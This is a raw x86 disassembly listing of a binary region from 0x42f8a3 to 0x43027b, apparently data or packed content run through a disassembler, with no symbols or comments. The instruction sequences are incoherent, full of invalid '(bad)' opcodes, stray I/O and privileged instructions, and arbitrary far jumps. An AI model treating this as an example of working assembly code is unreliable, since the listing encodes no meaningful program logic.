  42f8a3:	mov    ebp,0xbb46aa30
  42f8a8:	sti    
  42f8a9:	push   es
  42f8aa:	xchg   DWORD PTR ds:0xa6e11049,ecx
  42f8b0:	jl     0x42f8c6
  42f8b2:	(bad)  
  42f8b3:	jecxz  0x42f918
  42f8b5:	xchg   edi,eax
  42f8b6:	and    al,0x70
  42f8b8:	adc    ebx,edx
  42f8ba:	inc    ebp
  42f8bb:	dec    edx
  42f8bc:	push   es
  42f8bd:	cmp    dh,BYTE PTR [eax+0x30]
  42f8c0:	xchg   BYTE PTR [edx-0x349d660c],bh
  42f8c6:	sbb    bl,BYTE PTR [ecx+0x185766e1]
  42f8cc:	(bad)  
  42f8cd:	sub    ebx,ebx
  42f8cf:	addr16 ret 
  42f8d1:	or     bl,BYTE PTR [ebx]
  42f8d3:	loope  0x42f89b
  42f8d5:	loopne 0x42f91b
  42f8d7:	push   0xffffff9e
  42f8d9:	call   FWORD PTR [esi+0x8781ec0]
  42f8df:	jp     0x42f8ee
  42f8e1:	ins    DWORD PTR es:[edi],dx
  42f8e2:	push   ebp
  42f8e3:	mov    bh,al
  42f8e5:	(bad)  
  42f8e6:	xchg   ebp,eax
  42f8e7:	into   
  42f8e8:	imul   edi,DWORD PTR [bx+0x3f],0x22210fa2
  42f8f0:	stos   DWORD PTR es:[edi],eax
  42f8f1:	add    BYTE PTR [esi+0x65],0x7f
  42f8f5:	fdivr  DWORD PTR [esi]
  42f8f7:	dec    esi
  42f8f8:	pop    esi
  42f8f9:	repz push edi
  42f8fb:	fs dec esi
  42f8fd:	icebp  
  42f8fe:	xor    cl,dh
  42f900:	fiadd  DWORD PTR [esi]
  42f902:	push   ss
  42f903:	sbb    BYTE PTR [edi],bl
  42f905:	dec    edi
  42f906:	mov    al,0xa7
  42f908:	jg     0x42f976
  42f90a:	sub    DWORD PTR [ecx+0x463bbc25],esi
  42f910:	fild   DWORD PTR [eax]
	...
  42f972:	add    BYTE PTR [eax],al
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9e6
  42f981:	lods   al,BYTE PTR ds:[esi]
  42f982:	xchg   ecx,eax
  42f983:	add    BYTE PTR [edi+0x50001fe],bl
  42f989:	add    DWORD PTR [eax],eax
  42f98b:	add    dh,dh
  42f98d:	pop    es
  42f98e:	rcl    dl,1
  42f990:	repnz (bad) 
  42f994:	dec    eax
  42f995:	sbb    edi,0x5e
  42f998:	inc    eax
  42f999:	or     al,ch
  42f99b:	cmp    ch,ch
  42f99d:	stos   DWORD PTR es:[edi],eax
  42f99e:	not    BYTE PTR [ebx]
  42f9a0:	shl    DWORD PTR [ecx+0x71],1
  42f9a3:	js     0x42f9da
  42f9a5:	or     DWORD PTR [edx],eax
  42f9a7:	or     BYTE PTR [edx+0x73],cl
  42f9aa:	or     al,0x33
  42f9ac:	test   DWORD PTR [eax+ebx*4],edi
  42f9af:	lahf   
  42f9b0:	mov    bl,0x1f
  42f9b2:	pushf  
  42f9b3:	int    0x37
  42f9b5:	in     eax,dx
  42f9b6:	scas   eax,DWORD PTR es:[edi]
  42f9b7:	pop    esp
  42f9b8:	push   es
  42f9b9:	popa   
  42f9ba:	jb     0x42fa14
  42f9bc:	(bad)  
  42f9bd:	push   ebp
  42f9be:	cld    
  42f9bf:	das    
  42f9c0:	xlat   BYTE PTR ds:[ebx]
  42f9c1:	lahf   
  42f9c2:	pop    ds
  42f9c3:	mov    eax,0x14ce9c3
  42f9c8:	push   edi
  42f9c9:	adc    BYTE PTR [eax-0x6b],dh
  42f9cc:	push   es
  42f9cd:	sahf   
  42f9ce:	push   0xffffff8e
  42f9d0:	test   eax,0xed18e5e3
  42f9d5:	mov    BYTE PTR [ebx+esi*2+0x1c9bd628],dl
  42f9dc:	pusha  
  42f9dd:	mov    ecx,0xa05a58d5
  42f9e2:	pop    ss
  42f9e3:	cs pop esp
  42f9e5:	mov    bl,0x20
  42f9e7:	(bad)  
  42f9e8:	sbb    DWORD PTR [ecx],esi
  42f9ea:	data16 jge 0x42f9d3
  42f9ed:	scas   al,BYTE PTR es:[edi]
  42f9ee:	xor    ebx,DWORD PTR [ebp-0xc8bbf11]
  42f9f4:	icebp  
  42f9f5:	push   edi
  42f9f6:	dec    esp
  42f9f7:	mov    ch,0xf6
  42f9f9:	popf   
  42f9fa:	out    dx,al
  42f9fb:	icebp  
  42f9fc:	fprem1 
  42f9fe:	daa    
  42f9ff:	in     al,0x3b
  42fa01:	pop    esi
  42fa02:	dec    ebp
  42fa03:	jns    0x42fa04
  42fa05:	inc    edx
  42fa06:	in     al,0x9e
  42fa08:	xchg   edx,ebx
  42fa0a:	xor    DWORD PTR [esi+0x39],0x23145644
  42fa11:	or     eax,0x1b950b39
  42fa16:	fnsave [esi-0x74]
  42fa19:	call   0x1b25:0xd73438ad
  42fa20:	mov    eax,0x5575acb3
  42fa25:	sti    
  42fa26:	add    al,0xa0
  42fa28:	test   al,0x69
  42fa2a:	and    al,bl
  42fa2c:	mov    ah,0xc9
  42fa2e:	aas    
  42fa2f:	dec    ecx
  42fa30:	jp     0x42fa1e
  42fa32:	inc    esi
  42fa33:	enter  0x14a0,0xd4
  42fa37:	mov    ch,0x81
  42fa39:	push   ds
  42fa3a:	sub    dl,bh
  42fa3c:	cmp    DWORD PTR [edi-0x6],ecx
  42fa3f:	sub    eax,DWORD PTR [ebx-0x7d]
  42fa42:	cli    
  42fa43:	das    
  42fa44:	mov    al,ds:0x9234a3ba
  42fa49:	imul   ecx,DWORD PTR [edx-0x62],0xfffffffc
  42fa4d:	mov    DWORD PTR [ebx],ebx
  42fa4f:	mov    eax,ds:0x654c4286
  42fa54:	mov    eax,ds:0xfea3c1f3
  42fa59:	jnp    0x42fa45
  42fa5b:	test   al,0xa7
  42fa5d:	dec    edx
  42fa5e:	xor    BYTE PTR [ecx+0x6f],0x50
  42fa62:	out    dx,eax
  42fa63:	inc    eax
  42fa64:	or     al,0x97
  42fa66:	xor    esi,DWORD PTR [eax-0x4]
  42fa69:	push   edx
  42fa6a:	mov    ch,0xd5
  42fa6c:	scas   al,BYTE PTR es:[edi]
  42fa6d:	in     al,0xf8
  42fa6f:	aad    0x6f
  42fa71:	aad    0x6a
  42fa73:	and    al,dh
  42fa75:	xor    bh,al
  42fa77:	or     eax,0x8c9a966d
  42fa7c:	jmp    0x86dadf9
  42fa81:	addr16 inc esp
  42fa83:	jb     0x42fa8d
  42fa85:	fstp   QWORD PTR [eax]
  42fa87:	xor    al,ch
  42fa89:	into   
  42fa8a:	push   ds
  42fa8b:	mov    ebx,0x174ed10c
  42fa90:	sub    eax,0x0
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	iret   
  42fb01:	mov    bl,0xb9
  42fb03:	xchg   BYTE PTR [edi+edi*8+0x1050001],ah
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	xchg   ebp,eax
  42fb0d:	fisttp QWORD PTR ss:[esi-0x36]
  42fb11:	xchg   esi,eax
  42fb12:	neg    BYTE PTR [edx-0x79475aa6]
  42fb18:	addr16 sbb eax,0xa176e350
  42fb1e:	and    edx,ecx
  42fb20:	in     eax,dx
  42fb21:	mov    ebx,0xd5da1791
  42fb26:	push   esp
  42fb27:	inc    edx
  42fb28:	call   0x670e7bb
  42fb2d:	inc    esi
  42fb2e:	dec    esi
  42fb2f:	push   ecx
  42fb30:	lahf   
  42fb31:	mov    ecx,0x63616ba2
  42fb36:	es adc ebx,edx
  42fb39:	ins    BYTE PTR es:[edi],dx
  42fb3a:	arpl   WORD PTR [edi-0x7017885e],dx
  42fb40:	call   0xc8cb6e32
  42fb45:	lods   al,BYTE PTR ds:[esi]
  42fb46:	stos   DWORD PTR es:[edi],eax
  42fb47:	test   eax,edx
  42fb49:	or     BYTE PTR [edx],dh
  42fb4b:	repnz mov ah,0xbd
  42fb4e:	repnz sbb eax,DWORD PTR ds:[esi-0x71]
  42fb53:	fidivr WORD PTR [eax]
  42fb55:	fisubr DWORD PTR [edx+edi*2+0x18]
  42fb59:	lods   al,BYTE PTR ds:[esi]
  42fb5a:	js     0x42fb82
  42fb5c:	push   edx
  42fb5d:	jns    0x42fb8a
  42fb5f:	push   ecx
  42fb60:	and    esp,DWORD PTR [ebp+0x60a42bcb]
  42fb66:	lock rcr BYTE PTR [eax-0x5c50e6c7],1
  42fb6d:	jmp    0x2033e9be
  42fb72:	pop    eax
  42fb73:	clc    
  42fb74:	sub    al,0x3c
  42fb76:	xchg   esi,eax
  42fb77:	lds    ecx,FWORD PTR [edi-0x42]
  42fb7a:	adc    esp,ebp
  42fb7c:	stos   DWORD PTR es:[edi],eax
  42fb7d:	mov    eax,ds:0x12dbc9ff
  42fb82:	test   eax,0xbd255f52
  42fb87:	and    BYTE PTR [eax],bh
  42fb89:	bound  ebp,QWORD PTR [edi-0x4951c5d8]
  42fb8f:	mov    cl,BYTE PTR [edi-0x5f]
  42fb92:	mov    esp,0x1b84cdf3
  42fb97:	add    BYTE PTR [esi-0x34afba76],0xc2
  42fb9e:	mov    WORD PTR [edx-0x31],?
  42fba1:	arpl   WORD PTR [esi+0x468251ae],cx
  42fba7:	aas    
  42fba8:	mov    eax,0x2b997431
  42fbad:	cld    
  42fbae:	fimul  DWORD PTR [edx-0x31e69342]
  42fbb4:	repnz enter 0xaa80,0x8a
  42fbb9:	inc    ecx
  42fbba:	jmp    FWORD PTR [edi+0x48]
  42fbbd:	iret   
  42fbbe:	rol    al,cl
  42fbc0:	mov    bh,BYTE PTR [esp+edi*1-0x58]
  42fbc4:	and    esi,eax
  42fbc6:	xchg   edx,eax
  42fbc7:	xlat   BYTE PTR ds:[ebx]
  42fbc8:	imul   ebx,DWORD PTR [eax],0xffffff82
  42fbcb:	xlat   BYTE PTR ds:[ebx]
  42fbcc:	cmp    bh,dh
  42fbce:	je     0x42fbd8
  42fbd0:	retf   0x1c51
  42fbd3:	push   ebp
  42fbd4:	or     ebx,DWORD PTR [edi+0x7023b9c8]
  42fbda:	pop    es
  42fbdb:	stos   DWORD PTR es:[edi],eax
  42fbdc:	and    bh,ch
  42fbde:	lahf   
  42fbdf:	adc    al,0x27
  42fbe1:	bound  esi,QWORD PTR [esi+0x3f85e131]
  42fbe7:	inc    edx
  42fbe8:	in     al,0xbe
  42fbea:	mov    BYTE PTR [esi],ch
  42fbec:	xor    eax,0x4b665afe
  42fbf1:	pop    ds
  42fbf2:	(bad)  
  42fbf3:	pop    eax
  42fbf4:	retf   
  42fbf5:	neg    BYTE PTR [eax+0x643359f8]
  42fbfb:	jecxz  0x42fc3f
  42fbfd:	lods   al,BYTE PTR ds:[esi]
  42fbfe:	jae    0x42fc29
  42fc00:	mov    esi,gs
  42fc02:	dec    edx
  42fc03:	int    0x8f
  42fc05:	add    al,0x1d
  42fc07:	mov    dl,BYTE PTR [eax+0x564de46e]
  42fc0d:	fmul   QWORD PTR [edx+0x2b]
  42fc10:	out    0x0,eax
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [ecx+0x3],dh
  42fc82:	popf   
  42fc83:	daa    
  42fc84:	test   eax,0x5000200
  42fc89:	add    DWORD PTR [eax],eax
  42fc8b:	add    BYTE PTR [edi+eax*8-0x8b32a66],dh
  42fc92:	sbb    al,0xf5
  42fc94:	push   ecx
  42fc95:	ret    
  42fc96:	mov    dl,0x8b
  42fc98:	loopne 0x42fcfb
  42fc9a:	jne    0x42fce4
  42fc9c:	rcr    DWORD PTR [ebx-0x282681ff],0xef
  42fca3:	fs popa 
  42fca5:	xchg   esp,eax
  42fca6:	loope  0x42fd1e
  42fca8:	mov    ebp,0xbbdb7ad1
  42fcad:	pop    esi
  42fcae:	sub    eax,0x7abac007
  42fcb3:	and    bl,ch
  42fcb5:	xchg   esp,ecx
  42fcb7:	inc    ecx
  42fcb8:	idiv   BYTE PTR [ebx]
  42fcba:	call   0x1a12:0xadc32a77
  42fcc1:	bound  esp,QWORD PTR [ebp+0x2c]
  42fcc4:	outs   dx,BYTE PTR ds:[esi]
  42fcc5:	loop   0x42fc7d
  42fcc7:	in     eax,dx
  42fcc8:	out    dx,eax
  42fcc9:	jmp    0xdde885b7
  42fcce:	mov    ebp,0xd6ea8ed1
  42fcd3:	push   esp
  42fcd4:	ror    eax,1
  42fcd6:	push   ds
  42fcd7:	cmc    
  42fcd8:	inc    ecx
  42fcd9:	or     ebx,DWORD PTR [ecx+edx*8+0x4abaaabb]
  42fce0:	test   DWORD PTR ds:0x23c2f350,eax
  42fce6:	imul   eax,DWORD PTR [ebp-0x5a],0x46
  42fcea:	xor    ah,cl
  42fcec:	xchg   ebp,eax
  42fced:	retf   0x6afb
  42fcf0:	inc    esp
  42fcf1:	and    bl,BYTE PTR [edi]
  42fcf3:	add    eax,0xbe48eda6
  42fcf8:	test   al,0x94
  42fcfa:	into   
  42fcfb:	pop    ebx
  42fcfc:	out    dx,al
  42fcfd:	rcr    DWORD PTR [edi-0x2a069c9e],1
  42fd03:	jp     0x42fd82
  42fd05:	iret   
  42fd06:	es sbb eax,0xc877bcd8
  42fd0c:	and    bl,BYTE PTR [ecx-0x5e15074f]
  42fd12:	xchg   BYTE PTR [eax+0x4c],bl
  42fd15:	loop   0x42fd7d
  42fd17:	outs   dx,DWORD PTR ds:[esi]
  42fd18:	add    al,0xc8
  42fd1a:	jmp    0x50f9:0xa6503474
  42fd21:	xchg   ebx,eax
  42fd22:	pop    es
  42fd23:	mov    ebx,0xe9d659b5
  42fd28:	dec    esi
  42fd29:	jge    0x42fd87
  42fd2b:	xchg   BYTE PTR [ebp-0x2225baa1],al
  42fd31:	ds push ebp
  42fd33:	jne    0x42fd3c
  42fd35:	sub    al,0x34
  42fd37:	ins    BYTE PTR es:[edi],dx
  42fd38:	(bad)  
  42fd39:	arpl   bp,dx
  42fd3b:	mov    ds:0x7e14a9be,eax
  42fd40:	sbb    al,0xbe
  42fd42:	ins    DWORD PTR es:[edi],dx
  42fd43:	pop    edx
  42fd44:	add    BYTE PTR [edi+eiz*8+0x11],ch
  42fd48:	adc    al,0xc4
  42fd4a:	jae    0x42fd0d
  42fd4c:	jmp    0xbe28:0x1d083376
  42fd53:	dec    edi
  42fd54:	mov    dl,0xe3
  42fd56:	push   es
  42fd57:	pop    esi
  42fd58:	mul    BYTE PTR [ebx]
  42fd5a:	jg     0x42fcde
  42fd5c:	imul   ebp,DWORD PTR [esi+0x17539901],0x1e84a15b
  42fd66:	fs mov ah,0x8c
  42fd69:	repnz dec eax
  42fd6b:	sar    DWORD PTR [ebx],1
  42fd6d:	xchg   esp,eax
  42fd6e:	out    0x15,al
  42fd70:	push   ds
  42fd71:	jg     0x42fd69
  42fd73:	hlt    
  42fd74:	push   edx
  42fd75:	fst    DWORD PTR [eax-0x39]
  42fd78:	xchg   edi,eax
  42fd79:	xor    DWORD PTR [bx+0x6f75],ecx
  42fd7e:	(bad)  
  42fd7f:	sbb    esp,DWORD PTR [edi]
  42fd81:	fwait
  42fd82:	scas   al,BYTE PTR es:[edi]
  42fd83:	repz cmp al,0x6d
  42fd86:	daa    
  42fd87:	jne    0x42fd96
  42fd89:	dec    esi
  42fd8a:	cwde   
  42fd8b:	out    0x6a,eax
  42fd8d:	or     ebp,ecx
  42fd8f:	sub    BYTE PTR [ecx],bl
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz test al,0x46
  42fe02:	outs   dx,BYTE PTR ds:[esi]
  42fe03:	stc    
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0xea000001,al
  42fe0d:	bound  ecx,QWORD PTR [eax]
  42fe0f:	push   0xfffffff9
  42fe11:	cld    
  42fe12:	out    0xa1,al
  42fe14:	add    DWORD PTR ds:0xdae4990,esp
  42fe1a:	mov    DWORD PTR [ebx+ecx*2],esp
  42fe1d:	push   cs
  42fe1e:	push   ss
  42fe1f:	jecxz  0x42fdcc
  42fe21:	js     0x42fdf1
  42fe23:	push   ecx
  42fe24:	push   0x65
  42fe26:	sahf   
  42fe27:	xchg   DWORD PTR [ebp-0x59],edi
  42fe2a:	cwde   
  42fe2b:	stos   DWORD PTR es:[edi],eax
  42fe2c:	jmp    0x42fdcc
  42fe2e:	clc    
  42fe2f:	sub    cl,al
  42fe31:	jmp    0x9a9c:0x4fe2136d
  42fe38:	mov    ecx,0x16afc632
  42fe3d:	push   es
  42fe3e:	inc    ecx
  42fe3f:	xor    ebx,ebp
  42fe41:	or     eax,0x920f6d9b
  42fe46:	out    0xbf,al
  42fe48:	arpl   WORD PTR [eax],cx
  42fe4a:	add    edx,ecx
  42fe4c:	inc    ebp
  42fe4d:	idiv   BYTE PTR [esi-0x64]
  42fe50:	loopne 0x42fde1
  42fe52:	shl    BYTE PTR [edx+ebp*2],0xda
  42fe56:	jmp    0x42fe9f
  42fe58:	push   esp
  42fe59:	iret   
  42fe5a:	in     al,0xe0
  42fe5c:	jmp    0x3ccc0013
  42fe61:	sub    al,0xa0
  42fe63:	inc    esp
  42fe64:	addr16 xor al,bl
  42fe67:	enter  0x66fc,0xc0
  42fe6b:	xor    BYTE PTR [ebx-0x71],dh
  42fe6e:	popf   
  42fe6f:	mov    esi,0xc9925594
  42fe74:	push   ss
  42fe75:	sti    
  42fe76:	idiv   DWORD PTR [ebx]
  42fe78:	scas   eax,DWORD PTR es:[edi]
  42fe79:	sub    BYTE PTR [eax-0x10],ch
  42fe7c:	aad    0xda
  42fe7e:	xchg   edi,eax
  42fe7f:	or     al,0xcc
  42fe81:	aad    0x17
  42fe83:	add    ebp,DWORD PTR [edi+0x62]
  42fe86:	lods   eax,DWORD PTR ds:[esi]
  42fe87:	aaa    
  42fe88:	inc    esi
  42fe89:	xlat   BYTE PTR ds:[ebx]
  42fe8a:	push   0x7e
  42fe8c:	adc    BYTE PTR [eax-0x337591f6],0x97
  42fe93:	xchg   esi,eax
  42fe94:	jp     0x42fe84
  42fe96:	fidivr WORD PTR [esi+0x41]
  42fe99:	pop    eax
  42fe9a:	mov    ah,0xae
  42fe9c:	mov    bl,0xaa
  42fe9e:	imul   ecx,DWORD PTR [ecx+edi*8],0x7
  42fea2:	mov    eax,0xad2bea8b
  42fea7:	imul   eax,DWORD PTR [ecx+0x6b],0x44f0b7d5
  42feae:	add    bl,0x29
  42feb1:	shl    ecx,0x4a
  42feb4:	xor    eax,0x21c25f45
  42feb9:	popf   
  42feba:	xchg   ecx,eax
  42febb:	imul   esp,DWORD PTR [ecx-0x14f9d78c],0x1
  42fec2:	ins    BYTE PTR es:[edi],dx
  42fec3:	jno    0x42fea1
  42fec5:	aaa    
  42fec6:	jle    0x42ff17
  42fec8:	xchg   BYTE PTR [edx+0x550c811d],cl
  42fece:	mov    ecx,DWORD PTR [ebx+eax*1+0x13]
  42fed2:	ret    0x8bfe
  42fed5:	mov    dl,0x96
  42fed7:	loope  0x42fe9f
  42fed9:	enter  0x5f80,0xe5
  42fedd:	test   esp,ecx
  42fedf:	inc    edi
  42fee0:	dec    esp
  42fee1:	sahf   
  42fee2:	inc    esp
  42fee3:	jl     0x42ff5e
  42fee5:	out    dx,eax
  42fee6:	and    al,0xf5
  42fee8:	stos   DWORD PTR es:[edi],eax
  42fee9:	adc    al,0x4e
  42feeb:	shl    BYTE PTR [ebp-0x6f],1
  42feee:	fwait
  42feef:	xlat   BYTE PTR ds:[ebx]
  42fef0:	je     0x42ff2d
  42fef2:	outs   dx,BYTE PTR ds:[esi]
  42fef3:	xor    BYTE PTR [esi+0x37],bh
  42fef6:	(bad)  
  42fef7:	adc    eax,eax
  42fef9:	add    al,BYTE PTR [ebx]
  42fefb:	pop    edi
  42fefc:	lock xor DWORD PTR [edx+esi*1-0x25e795b3],edi
  42ff04:	loop   0x42ff29
  42ff06:	mov    ds:0x623cd9f5,al
  42ff0b:	pop    ebp
  42ff0c:	xchg   edi,eax
  42ff0d:	push   ss
  42ff0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff0f:	or     DWORD PTR [edi],esp
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ecx+eax*8-0x66],0x44
  42ff83:	pop    ebp
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	add    eax,0xb0000001
  42ff8d:	out    0xc,al
  42ff8f:	repnz arpl si,cx
  42ff92:	cmp    eax,0xae8341a3
  42ff97:	mov    bl,BYTE PTR [edi-0x33]
  42ff9a:	mov    DWORD PTR [esi-0xbc1402d],0xf11cc6b8
  42ffa4:	add    al,0xb7
  42ffa6:	sub    al,0xd
  42ffa8:	(bad)  
  42ffa9:	xor    eax,0x9b9847c7
  42ffae:	xor    BYTE PTR [edi+0x3a],al
  42ffb1:	pusha  
  42ffb2:	fs lahf 
  42ffb4:	test   BYTE PTR [ecx+0x3cc7994f],bh
  42ffba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffbb:	mov    dh,0x72
  42ffbd:	cmp    eax,0x72683b4a
  42ffc2:	call   0x8e4e:0x9b0f086c
  42ffc9:	je     0x42ffe3
  42ffcb:	xchg   edx,eax
  42ffcc:	mov    dh,BYTE PTR [ebx-0x4f]
  42ffcf:	rol    bl,1
  42ffd1:	sbb    eax,DWORD PTR [ebx+0x35d993ae]
  42ffd7:	fwait
  42ffd8:	cmp    BYTE PTR [edx+0x4b27f5d0],ch
  42ffde:	dec    edx
  42ffdf:	scas   eax,DWORD PTR es:[edi]
  42ffe0:	xor    DWORD PTR [edx+0x43],ebp
  42ffe3:	and    ch,ah
  42ffe5:	mov    eax,ds:0xacd561d8
  42ffea:	mov    bh,0x52
  42ffec:	add    ecx,DWORD PTR [edx]
  42ffee:	pop    esp
  42ffef:	mov    BYTE PTR [edi],bl
  42fff1:	cmc    
  42fff2:	scas   eax,DWORD PTR es:[edi]
  42fff3:	and    al,BYTE PTR [esp+eax*1-0x64]
  42fff7:	ins    BYTE PTR es:[edi],dx
  42fff8:	int3   
  42fff9:	sub    BYTE PTR [edx+0x3c5134eb],0xbb
  430000:	mov    ds:0xfdab6926,eax
  430005:	je     0x42ffbf
  430007:	into   
  430008:	jo     0x42ffe8
  43000a:	pusha  
  43000b:	mov    ds:0x95a9528f,eax
  430010:	inc    ebx
  430011:	ss sub eax,0x7ad601c8
  430017:	adc    al,0x2
  430019:	out    dx,eax
  43001a:	xchg   edx,eax
  43001b:	dec    ebx
  43001c:	aaa    
  43001d:	scas   eax,DWORD PTR es:[edi]
  43001e:	dec    eax
  43001f:	mov    ds:0xf3065d83,eax
  430024:	sub    BYTE PTR [edi-0x28],al
  430027:	jmp    0x2f42:0xdf24d3b9
  43002e:	int    0x29
  430030:	(bad)  
  430031:	dec    ebx
  430032:	lds    edi,FWORD PTR [edi]
  430034:	push   esi
  430035:	adc    edi,edx
  430037:	sbb    bl,bh
  430039:	xor    edi,eax
  43003b:	inc    esi
  43003c:	jnp    0x42ffff
  43003e:	push   es
  43003f:	cli    
  430040:	ja     0x43008d
  430042:	xor    eax,0x1509fd07
  430047:	sbb    al,0x19
  430049:	int3   
  43004a:	mov    esi,0x33d47751
  43004f:	mov    ebx,0x406a3030
  430054:	dec    ebp
  430055:	jp     0x430076
  430057:	scas   al,BYTE PTR es:[edi]
  430058:	fdiv   QWORD PTR [ebp-0x3c]
  43005b:	test   al,0x9e
  43005d:	out    dx,eax
  43005e:	push   0xffffffaa
  430060:	mov    dl,0x97
  430062:	inc    edi
  430063:	xchg   esp,eax
  430064:	(bad)  [ebx+0x6]
  430067:	aaa    
  430068:	in     eax,0xce
  43006a:	or     al,0x48
  43006c:	scas   al,BYTE PTR es:[edi]
  43006d:	mov    ds:0x4c3f9d85,al
  430072:	in     al,dx
  430073:	sub    eax,0x456dc87f
  430078:	xchg   ebp,eax
  430079:	push   0x636c7c2b
  43007e:	or     DWORD PTR [edi],ebx
  430080:	lock dec edx
  430082:	xchg   DWORD PTR [ebp-0x25],ebx
  430085:	xchg   ecx,eax
  430086:	sub    BYTE PTR [ebx],bl
  430088:	jo     0x430088
  43008a:	pop    es
  43008b:	dec    esi
  43008c:	mov    al,0x6f
  43008e:	pop    eax
  43008f:	call   0x0:0x24
	...
  4300f2:	add    BYTE PTR [eax],al
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x2d
  430101:	xor    DWORD PTR [ebx+0x203b8a2],eax
  430107:	add    BYTE PTR [esi],cl
  430109:	add    BYTE PTR [eax],al
  43010b:	add    dh,ch
  43010d:	jo     0x43013e
  43010f:	dec    esi
  430110:	pop    ebx
  430111:	stc    
  430112:	retf   
  430113:	pop    ebx
  430114:	inc    ebp
  430115:	lds    edx,FWORD PTR ds:0x59aa8
	...
  430173:	add    BYTE PTR [ebp+0x55],cl
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
